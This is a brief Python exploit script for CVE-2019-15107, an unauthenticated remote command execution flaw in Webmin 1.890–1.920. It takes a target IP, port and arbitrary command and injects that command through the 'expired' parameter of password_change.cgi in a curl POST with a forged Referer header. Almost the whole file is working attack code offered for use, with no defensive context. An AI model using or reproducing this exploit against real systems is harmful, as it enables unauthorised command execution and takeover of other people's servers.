#!/usr/bin/python3
#Webmin 1.890-1.920 RCE
#CVE-2019-15107
#Johnny Chafla | @jch | @hacknotes
#site https://hacknotes.github.io/

import sys,os

if len(sys.argv) < 4:
 print ("\nUsage: python3 " + sys.argv[0] + " <ip addres> " + "<port>" + " <command>")
 print ("Example: python3 " + sys.argv[0] + " 10.200.198.200" + " 10000" + " id")
 sys.exit(0)

# global varials
ip_addres = sys.argv[1]
r_port = sys.argv[2]
url = "https://"+ip_addres+":"+r_port+"/password_change.cgi"
command = sys.argv[3]

def exploit(ip_addres, r_port, url, command):

 header = 'Referer: https://{}:{}/session_login.cgi'.format(ip_addres,r_port)
 payload = 'user=jch&pam=&expired=2|echo "";{}'.format(command)
 os.system("curl -s -k {} -d '{}' -H '{}' | grep -v -E '<p>|<h1>|</p>'".format(url,payload,header))

if __name__ == '__main__':

 try:

  print ("\n[*] Result: \n")
  exploit(ip_addres, r_port, url, command)

 except:

  print ("\nUsage: python3 " + sys.argv[0] + " <ip addres> " + "<port>" + " <command>")
  print ("Example: python3 " + sys.argv[0] + " 10.200.198.200" + " 10000" + " id")

  sys.exit(0)
